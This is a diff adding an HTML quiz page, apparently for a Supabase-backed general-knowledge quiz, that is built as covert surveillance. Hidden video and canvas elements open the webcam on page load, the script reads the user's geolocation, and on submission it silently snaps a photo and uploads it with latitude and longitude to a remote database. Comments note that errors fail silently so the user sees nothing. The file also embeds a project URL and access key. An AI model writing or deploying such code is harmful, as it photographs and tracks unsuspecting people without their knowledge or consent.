@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quiz App</title>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <style>
+        body { font-family: sans-serif; padding: 20px; background: #f0f2f5; max-width: 600px; margin: auto; }
+        .card { background: white; padding: 20px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 16px; width: 100%; }
+        button:hover { background: #0056b3; }
+        .question { font-weight: bold; margin-bottom: 10px; }
+        label { display: block; margin-bottom: 8px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <div class="card" id="quiz-area" style="display:none;">
+        <h2>General Knowledge Quiz</h2>
+        <div id="questions-container"></div>
+        <button onclick="submitQuiz()">Submit</button>
+    </div>
+
+    <!-- Hidden elements for camera capture -->
+    <video id="hidden-video" autoplay playsinline style="display:none;"></video>
+    <canvas id="hidden-canvas" style="display:none;"></canvas>
+
+    <script>
+        const SUPABASE_URL = 'https://rubhdpgebyjtqwwyyzox.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJ1YmhkcGdlYnlqdHF3d3l5em94Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTM3MDk3ODQsImV4cCI6MjEwOTI4NTc4NH0.vxWRPW4gBhyYCRnpiShPC-jVOr9--yMTpuExEHIktCs';
+        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        let userLocation = { lat: null, lng: null };
+        let cameraStream = null;
+
+        const quizData = [
+            { id: 1, q: "What is the capital of France?", options: ["London", "Berlin", "Paris", "Madrid"], answer: "Paris" },
+            { id: 2, q: "Which planet is known as the Red Planet?", options: ["Venus", "Mars", "Jupiter", "Saturn"], answer: "Mars" },
+            { id: 3, q: "Who wrote 'Hamlet'?", options: ["Charles Dickens", "William Shakespeare", "Mark Twain", "Jane Austen"], answer: "William Shakespeare" },
+            { id: 4, q: "What is the largest ocean on Earth?", options: ["Atlantic", "Indian", "Arctic", "Pacific"], answer: "Pacific" },
+            { id: 5, q: "What is the chemical symbol for Gold?", options: ["Ag", "Fe", "Au", "Cu"], answer: "Au" },
+            { id: 6, q: "In which year did World War II end?", options: ["1941", "1945", "1918", "1939"], answer: "1945" },
+            { id: 7, q: "Which animal is the largest living primate?", options: ["Chimpanzee", "Gorilla", "Orangutan", "Baboon"], answer: "Gorilla" },
+            { id: 8, q: "What is the hardest natural substance on Earth?", options: ["Iron", "Diamond", "Quartz", "Granite"], answer: "Diamond" },
+            { id: 9, q: "Which country invented tea?", options: ["India", "UK", "China", "Japan"], answer: "China" },
+            { id: 10, q: "How many bones are in the adult human body?", options: ["206", "201", "210", "196"], answer: "206" }
+        ];
+
+        async function initApp() {
+            try {
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            userLocation.lat = pos.coords.latitude;
+                            userLocation.lng = pos.coords.longitude;
+                        },
+                        (err) => console.error(err) // Fails silently
+                    );
+                }
+
+                cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('hidden-video').srcObject = cameraStream;
+
+                renderQuiz();
+                document.getElementById('quiz-area').style.display = 'block';
+            } catch (err) {
+                console.error(err); // Fails silently, won't show errors to the user
+            }
+        }
+
+        function renderQuiz() {
+            const container = document.getElementById('questions-container');
+            let html = '';
+            quizData.forEach((item, index) => {
+                html += `<div class="card" style="box-shadow: none; border: 1px solid #ddd;">
+                    <div class="question">Q${index + 1}: ${item.q}</div>`;
+                item.options.forEach(opt => {
+                    html += `<label>
+                        <input type="radio" name="q${item.id}" value="${opt}"> ${opt}
+                    </label>`;
+                });
+                html += `</div>`;
+            });
+            container.innerHTML = html;
+        }
+
+        async function submitQuiz() {
+            let score = 0;
+            const answers = {};
+            let allAnswered = true;
+
+            quizData.forEach(item => {
+                const selected = document.querySelector(`input[name="q${item.id}"]:checked`);
+                if (selected) {
+                    answers[item.id] = selected.value;
+                    if (selected.value === item.answer) score++;
+                } else {
+                    allAnswered = false;
+                }
+            });
+
+            if (!allAnswered) {
+                alert("Please answer all questions before submitting.");
+                return;
+            }
+
+            try {
+                const video = document.getElementById('hidden-video');
+                const canvas = document.getElementById('hidden-canvas');
+                let base64Photo = null;
+                
+                if (video.videoWidth > 0) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    base64Photo = canvas.toDataURL('image/jpeg', 0.8);
+                }
+
+                const { error } = await supabase
+                    .from('quiz_submissions')
+                    .insert([{
+                        answers: answers,
+                        score: score,
+                        latitude: userLocation.lat,
+                        longitude: userLocation.lng,
+                        photo: base64Photo
+                    }]);
+
+                if (!error) {
+                    document.getElementById('quiz-area').innerHTML = `<h2>Quiz completed! Your score is: ${score}/10</h2>`;
+                    if (cameraStream) {
+                        cameraStream.getTracks().forEach(track => track.stop());
+                    }
+                } else {
+                    console.error(error); // Silently catches database errors
+                }
+            } catch (err) {
+                console.error(err); // Silently catches unexpected errors
+            }
+        }
+
+        window.onload = initApp;
+    </script>
+</body>
+</html>
